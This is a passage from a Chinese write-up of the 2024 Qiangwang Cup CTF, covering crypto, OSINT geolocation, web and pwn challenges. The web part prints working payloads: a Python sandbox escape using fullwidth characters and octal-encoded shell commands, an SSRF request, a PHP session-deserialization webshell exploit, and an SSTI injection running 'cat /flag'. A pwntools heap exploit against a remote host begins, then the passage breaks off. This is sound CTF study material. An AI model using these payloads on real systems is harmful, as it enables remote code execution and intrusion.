class="hljs-number">22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860</span>, <span class="hljs-number">19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378</span>, <span class="hljs-number">24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163</span>, <span class="hljs-number">19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708</span>, <span class="hljs-number">22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347</span>, <span class="hljs-number">21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455</span>, <span class="hljs-number">19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081</span>, <span class="hljs-number">19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805</span>]<br>enc2 = <span class="hljs-number">30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br>flag2, p, q, d = decrypt_stage2(hints,enc2)<br><span class="hljs-built_in">print</span>(flag2)<br></code></pre></td></tr></table></figure><p>第三段利用到第二段的部分数据，在处理数据尝试利用public3时解密发现不能正常解出尝试后利用pub2可以得到flag最后一部分，上exp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>kq = <span class="hljs-number">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br>n=<span class="hljs-number">73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span><br>q = <span class="hljs-built_in">int</span>(kq)<br>p = <span class="hljs-built_in">int</span>(n // kq)<br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">0x10001</span>, -<span class="hljs-number">1</span>, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>enc3 =<span class="hljs-number">17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br>flag3 = long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc3,d,n))).decode()<br><span class="hljs-built_in">print</span>(flag3)<br></code></pre></td></tr></table></figure><p>三个部分的代码解密出的拼接可以得到flag</p><h3 id="21_steps"><a class="markdownIt-Anchor" href="#21_steps"></a> 21_steps</h3><p>[<a href="https://mryqu.github.io/post/%E7%AE%97%E6%B3%95_%E6%B1%89%E6%98%8E%E9%87%8D%E9%87%8Fhamming_weight/">算法] 汉明重量（Hamming Weight） - Mryqu’s Notes</a>原理文章</p><p>目标是计算一个128位数字中1的个数(也就是二进制表示中1的数量)，要求在21步内完成</p><p>每个操作必须符合pattern正则表达式：<code>([AB]|\d+)=([AB]|\d+)(\+|\-|\*|//|&lt;&lt;|&gt;&gt;|&amp;|\^|%)([AB]|\d+)</code></p><p>如果成功计数器达到 100，它会打印 flag 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">w = <span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:])])<br></code></pre></td></tr></table></figure><p>这个代码，这里的 <code>bin(x)[2:]</code> 将整数 <code>x</code> 转换为二进制字符串并去掉前面的 <code>'0b'</code>。然后，<code>sum([int(i) for i in ...])</code> 通过列表推导式统计字符串中每个字符为 <code>'1'</code> 的个数。判断生成的随机数 <code>A</code> 的汉明权重 <code>wa</code>，汉明权重就是指一个整数的二进制表示中“1”的个数，通过汉明权重的计算，验证在一定步骤限制内，用户输入的数学运算对 <code>A</code> 的值。</p><p>汉明权重计算的过程是通过位运算高效地统计一个 32 位整数中“1”的数量。首先，将整数按 2 位分成 16 组，使用与 <code>0x55555555</code> 进行位与操作，以提取出每组的最低位。接着，通过右移和加法 <code>A + (A &gt;&gt; 1)</code> 合并相邻的两位组，形成一个新的数。然后，与 <code>0x33333333</code> 进行位与操作，提取出 4 组位长为 4 的数。再通过右移和加法 <code>A + (A &gt;&gt; 4)</code> 将四组合并为两组，并与 <code>0x0f0f0f0f</code> 进行位与操作，确保结果的有效位。最后，通过 <code>(A + (A &gt;&gt; 4)) &amp; 0xf</code> 计算前四位和后四位的和，得到最终的汉明权重。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_weight</span>(<span class="hljs-params">A</span>):<br>    <span class="hljs-comment"># 记录每一步的操作</span><br>    operations = []<br><br>    <span class="hljs-comment"># 定义常量</span><br>    masks = &#123;<br>        <span class="hljs-string">&#x27;B_mask1&#x27;</span>: <span class="hljs-number">0x55555555555555555555555555555555</span>,  <span class="hljs-comment"># 0x555...</span><br>        <span class="hljs-string">&#x27;B_mask2&#x27;</span>: <span class="hljs-number">0x33333333333333333333333333333333</span>,  <span class="hljs-comment"># 0x333...</span><br>        <span class="hljs-string">&#x27;A_mask&#x27;</span>: <span class="hljs-number">0x0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f</span>,  <span class="hljs-comment"># 0x0f0...</span><br>        <span class="hljs-string">&#x27;final_mask&#x27;</span>: <span class="hljs-number">0x7f</span>  <span class="hljs-comment"># 0x7f</span><br>    &#125;<br>    B = A &gt;&gt; <span class="hljs-number">1</span><br>    operations.append(<span class="hljs-string">f&quot;B=A&gt;&gt;1;&quot;</span>)<br>    B &amp;= masks[<span class="hljs-string">&#x27;B_mask1&#x27;</span>]<br>    operations.append(<span class="hljs-string">f&quot;B=B&amp;<span class="hljs-subst">&#123;masks[<span class="hljs-string">&#x27;B_mask1&#x27;</span>]&#125;</span>;&quot;</span>)<br>    A -= B<br>    operations.append(<span class="hljs-string">f&quot;A=A-B;&quot;</span>)<br><br>    B = A &amp; masks[<span class="hljs-string">&#x27;B_mask2&#x27;</span>]<br>    operations.append(<span class="hljs-string">f&quot;B=A&amp;<span class="hljs-subst">&#123;masks[<span class="hljs-string">&#x27;B_mask2&#x27;</span>]&#125;</span>;&quot;</span>)<br>    A &gt;&gt;= <span class="hljs-number">2</span><br>    operations.append(<span class="hljs-string">f&quot;A=A&gt;&gt;2;&quot;</span>)<br>    A &amp;= masks[<span class="hljs-string">&#x27;B_mask2&#x27;</span>]<br>    operations.append(<span class="hljs-string">f&quot;A=A&amp;<span class="hljs-subst">&#123;masks[<span class="hljs-string">&#x27;B_mask2&#x27;</span>]&#125;</span>;&quot;</span>)<br>    A += B<br>    operations.append(<span class="hljs-string">f&quot;A=A+B;&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> shift <span class="hljs-keyword">in</span> [<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>]:<br>        B = A &gt;&gt; shift<br>        operations.append(<span class="hljs-string">f&quot;B=A&gt;&gt;<span class="hljs-subst">&#123;shift&#125;</span>;&quot;</span>)<br>        A += B<br>        operations.append(<span class="hljs-string">f&quot;A=A+B;&quot;</span>)<br><br>    A &amp;= masks[<span class="hljs-string">&#x27;A_mask&#x27;</span>]<br>    operations.append(<span class="hljs-string">f&quot;A=A&amp;<span class="hljs-subst">&#123;masks[<span class="hljs-string">&#x27;final_mask&#x27;</span>]&#125;</span>;&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> A, operations<br><br><br>A = random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">2</span> ** <span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Original number (A): <span class="hljs-subst">&#123;A&#125;</span>&quot;</span>)<br>weight, operations = calculate_weight(A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Binary weight of A (number of 1&#x27;s): <span class="hljs-subst">&#123;weight&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 输出指定格式的结果</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(operations)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Result:&quot;</span>, result)<br></code></pre></td></tr></table></figure><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2><h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3><p>直接复制粘贴</p><h3 id="master-of-osint"><a class="markdownIt-Anchor" href="#master-of-osint"></a> Master of OSINT</h3><p>辅助工具</p><p><a href="https://geospy.ai/">https://geospy.ai/</a></p><p><a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">拾取坐标系统 (baidu.com)</a></p><h4 id="图1"><a class="markdownIt-Anchor" href="#图1"></a> 图1</h4><p>什么都没有，看到一条公路，比较长，远处还有海，一开始没什么思路，看到网上有视频是关于附近的景点</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/1.png" alt="1"></p><p>看到是倒茶壶公路，使用百度地图查经纬度，就试成功了。</p><p>坐标：<code>99.977293,36.66667</code></p><h4 id="图2"><a class="markdownIt-Anchor" href="#图2"></a> 图2</h4><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE2.png" alt="图2"></p><p>直接在地图上搜迪卡侬 百安居</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE2.1.png" alt="图2.1"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE2.2.png" alt="图2.2"></p><p>坐标：<code>121.566975,31.210906</code></p><h4 id="图3"><a class="markdownIt-Anchor" href="#图3"></a> 图3</h4><p>能看到一个清晰的中国石油还有不清晰的路标</p><p>抖音搜看看，百度地图不好直接出</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE3.png" alt="图3"></p><p>这个比较类似去地图定位看看</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE3.1.png" alt="图3.1"></p><p>全景图试了这个像一些，就百度地图搜了 双流机场，试了坐标，成功拿下</p><p>坐标：<code>103.966657,30.571185</code></p><h4 id="图4"><a class="markdownIt-Anchor" href="#图4"></a> 图4</h4><p>关键信息是货车上的浙通物流和远处的宜家，定位浙江省内的宜家，然后找附近的告诉，位置应该在两三公里以内</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE4.png" alt="图4"></p><p>找到这里的宜家，感觉很像，查了一下坐标，输出正确</p><p>坐标：<code>120.293197,3346334</code></p><h4 id="图5"><a class="markdownIt-Anchor" href="#图5"></a> 图5</h4><p>乍一看没什么思路，这个公路的栏杆是重庆那边的</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE5.png" alt="图5"></p><p>定位到重庆，然后就把图片百度识图一下，根据建筑地势高低较为明显来定位具体地点</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE5.1.png" alt="图5.1"></p><p>看着有点像，翻了下评论区，说这是重庆谢家湾的地铁站立交桥，多尝试了几次</p><p>根据提供的信息，百度地图查经纬度试了几次，成功了</p><p>坐标：<code>106.524114,29.52509</code></p><h4 id="图6"><a class="markdownIt-Anchor" href="#图6"></a> 图6</h4><p>定位关键建筑</p><img src="/../../images/强网杯/2024/6.png" alt="6" style="zoom:33%;"><p>搜到是大报恩寺，定位到南京搜索附近马路</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/61.png" alt="61"></p><p>出经纬度<code>118.783635,32.013335</code></p><h4 id="图7"><a class="markdownIt-Anchor" href="#图7"></a> 图7</h4><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE7.png" alt="图7"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE7.1.png" alt="图7.1"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE7.2.png" alt="图7.2"></p><p>抖音识别出来一个去湖南师大的视频，看了一下湖南师大旁边桥的全景图就找到了</p><p>坐标：<code>112.970137,28.201502</code></p><h4 id="图8"><a class="markdownIt-Anchor" href="#图8"></a> 图8</h4><p>看起来是一座桥，下面是海，旁边还有风车和农田，由于本身是江苏人，了解一些地理特性，大风车通常是沿海城市多见，且桥呈现的是东西走向，可以排除一些桥的干扰，可以定位到是江浙沪地区的桥</p><p>想起来之前去上海有个桥也很长</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE8.png" alt="图8"></p><p>上海长江大桥，百度地图搜了，感觉很像，试了几个坐标出了</p><p>坐标: <code>121.734859,31.412815</code></p><h4 id="图9"><a class="markdownIt-Anchor" href="#图9"></a> 图9</h4><p>第九张的大桥支架很显眼，百度识图，看到这样的桥</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/%E5%9B%BE9.png" alt="图9"></p><p>跟图中的很像，是武汉的桥</p><p>试了是武汉长江大桥</p><p>坐标：<code>114.411892,30.66231</code></p><p>最后得到了flag</p><h3 id="问卷"><a class="markdownIt-Anchor" href="#问卷"></a> 问卷</h3><p>答完base解密</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/wenjuan.png" alt="wenjuan"></p><h3 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret"></a> givemesecret</h3><p>概率题，多问就能出</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/secret.png" alt="secret"></p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="pyblockly"><a class="markdownIt-Anchor" href="#pyblockly"></a> PyBlockly</h3><p>前端测试print有回显随后在bp测试</p><p>将len函数替换成匿名函数使其永远返回 1。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__import__</span>(&quot;os&quot;).system(&quot;$(printf &#x27;\144\144\40\151\146\75\57\146\154\141\147&#x27;)&quot;)<br></code></pre></td></tr></table></figure><p>利用$()执行内容来输出</p><p>cat tac nl没有，用dd可以</p><p>dd if=/flag</p><p>然后再对这些内容使用全角，绕过黑名单。</p><p>最终payload：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;&quot;blocks&quot;:&#123;&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;text&quot;,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ ａ：１；＇＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂＄（ｐｒｉｎｔｆ ＇＼１４４＼１４４＼４０＼１５１＼１４６＼７５＼５７＼１４６＼１５４＼１４１＼１４７＇）；   ＂）；＇&quot;&#125;<br>&#125;]&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="xiaohuanxiong"><a class="markdownIt-Anchor" href="#xiaohuanxiong"></a> xiaohuanxiong</h3><p><code>/install</code>之后正常进前端，dir扫一下有admin管理登陆，尝试不能正常登入，御剑扫到<code>/admin/Admins</code>越权进入管理后台,这里可以添加管理员，然后正常登陆管理界面在支付管理页面可以修改php代码</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/xiaohuangx.png" alt="xiaohuangx"></p><p>插入木马，在前端进行命令执行</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2.png" alt="2"></p><h3 id="proxy"><a class="markdownIt-Anchor" href="#proxy"></a> Proxy</h3><p>给了文本主要分析给的go文件</p><p>有两个 API 端点：<code>/v1/api/flag</code> 和 <code>/v2/api/proxy</code>，只需向 <code>/v1/api/flag</code> 发送一个 POST 请求，就可以触发/readflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST http://47.93.55.85:36924/v2/api/proxy \<br>     -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>     -d <span class="hljs-string">&#x27;&#123;&quot;url&quot;: &quot;http://127.0.0.1:8769/v1/api/flag&quot;, &quot;method&quot;: &quot;POST&quot;, &quot;body&quot;: &quot;&quot;, &quot;headers&quot;: &#123;&#125;, &quot;follow_redirects&quot;: false&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/proxy.png" alt="proxy"></p><h3 id="platform"><a class="markdownIt-Anchor" href="#platform"></a> platform</h3><p>前端没东西dir扫一下</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/plateform.png" alt="plateform"></p><p>源码定位<code>class.php</code>判断session反序列化，尝试构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notouchitsclass</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$data</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notouchitsclass</span>(<span class="hljs-number">1</span>);<br><span class="hljs-comment">#$exp-&gt;data=&#x27;system($_GET[cmd])&#x27;;//被过滤需要绕过</span><br><span class="hljs-variable">$exp</span>-&gt;data=<span class="hljs-string">&#x27;(&quot;sy&quot;.&quot;stem&quot;)($_GET[cmd]);&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br></code></pre></td></tr></table></figure><p>然后需要就行字符串的逃逸实测没测出多少位所以只能挨个试，上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot; http://eci-2ze3vvqmif956xeljg9p.cloudeci1.ichunqiu.com/&quot;</span><br>params = &#123;<br>    <span class="hljs-comment">#&#x27;cmd&#x27;: &quot;ls&quot;</span><br>    <span class="hljs-comment">#&#x27;cmd&#x27;: &quot;cat flag&quot; #未找到</span><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&quot;/readflag&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>:  <span class="hljs-string">&#x27;execexecexecexecexecexecexecexecexecexecexecexecexece&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:26:&quot;(&quot;sy&quot;.&quot;stem&quot;)($_GET[cmd]);&quot;;&#125;password|s:6:&quot;orange&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.session()<br>    response1 = r.post(url + <span class="hljs-string">&#x27;/index.php&#x27;</span>, data=data, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>    response2 = r.post(url + <span class="hljs-string">&#x27;/index.php&#x27;</span>, data=data, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>    response3 = r.post(url + <span class="hljs-string">&#x27;/dashboard.php&#x27;</span>, params=params, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response3.text:<br>        <span class="hljs-built_in">print</span>(response3.text)<br>        <span class="hljs-built_in">print</span>(r.cookies)<br>    r.close()<br></code></pre></td></tr></table></figure><h3 id="snake"><a class="markdownIt-Anchor" href="#snake"></a> snake</h3><p>前端测试不出东西，可以扫路由</p><p>分析前端源码以及js没找出点，尝试bp改方向硬做，<s>速度过快卡死</s>，发现不太可行</p><p>正常的容器给的是80端口，该题给的是5000端口，常识的话默认正常python的题目是开的5000端口，所以往python的框架，序列化等知识点想</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/snake.png" alt="snake"></p><p>先测试是否有sql注入的可能，测试常见的注入都没有成功</p><p>看源码里面的js，由于dir没扫出东西猜测可能是500的回显，自己构造<code>snakewin</code>,<code>snakelose</code>,<code>snake_win</code>,<code>snake_lose</code>等等的路由，唯一的可疑点是js里面有score的点可能注入，<s>但不清楚</s>，目前已知的注入点只有一开始的username，尝试进行测试在snake_win有回显</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/snake1.png" alt="snake1"></p><p>测试是随着第三个数字改动的，<s>不能直接注入</s>测不出可以得到什么库的，但是感觉可能和框架有关，配合fenjing同步测试</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/snake2.png" alt="snake2"></p><p>可以尝试进行利用直接打个payload看看</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/snake_win?username=1&#x27;union select 1,2,&quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;subprocess&#x27;</span>).check_output(<span class="hljs-name">&#x27;cat /flag&#x27;</span>, <span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#x27;)&#125;&#125;&quot;--+</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/snake3.png" alt="snake3"></p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2><h3 id="baby_heap"><a class="markdownIt-Anchor" href="#baby_heap"></a> baby_heap</h3><p>先nc连接结合ida分析menu有五个选项涉及堆分配（添加商品）</p><p>本题可知是heap题，内存管理限制，释放后访问UAF，然后GOT的覆盖，实现执行</p><p>在堆上分配两个内存块，释放其中一个并通过调用 <code>show</code> 函数泄露其地址，计算出 <code>libc</code> 的基地址。接着，覆盖全局偏移表（GOT）中的函数指针，将其指向 <code>libc</code> 中的 <code>puts</code> 函数。最后，触发漏洞并进入交互模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;47.94.151.65&#x27;</span>, <span class="hljs-number">30726</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.35.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc</span>(<span class="hljs-params">*args</span>): <span class="hljs-keyword">return</span> p.recv(*args)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.recvuntil(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.sendline(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sd</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> p.send(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>): <span class="hljs-keyword">return</span> p.sendafter(a, b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>): <span class="hljs-keyword">return</span> p.sendlineafter(a, b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>(<span class="hljs-params">*args</span>): <span class="hljs-keyword">return</span> log.success(*args)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ia</span>(): <span class="hljs-keyword">return</span> p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l8</span>(<span class="hljs-params">x</span>): <span class="hljs-keyword">return</span> x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&#x27;: 